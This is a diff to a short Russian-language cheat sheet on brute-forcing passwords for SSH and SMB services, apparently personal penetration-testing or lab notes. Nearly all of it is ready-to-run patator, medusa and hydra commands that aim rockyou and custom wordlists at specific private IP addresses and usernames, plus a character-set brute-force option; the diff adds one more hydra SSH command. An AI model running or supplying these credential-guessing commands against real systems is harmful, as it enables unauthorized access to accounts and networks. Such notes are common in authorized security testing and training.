@@ -1,6 +1,3 @@
-
-
-
 Перебор паролей для сервисов SSH, smb и т.д.
 
 patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’
@@ -11,6 +8,10 @@ medusa -h 192.168.50.38 -u michael -P rockyou.txt -M ssh -f -v 6
 
 hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
 hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt 192.168.1.5 smb -V
+
+(не для домена)
+
+hydra -l micha -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.200
 
 !!!!Brute char!!!! -x min:max:Aa1%
 
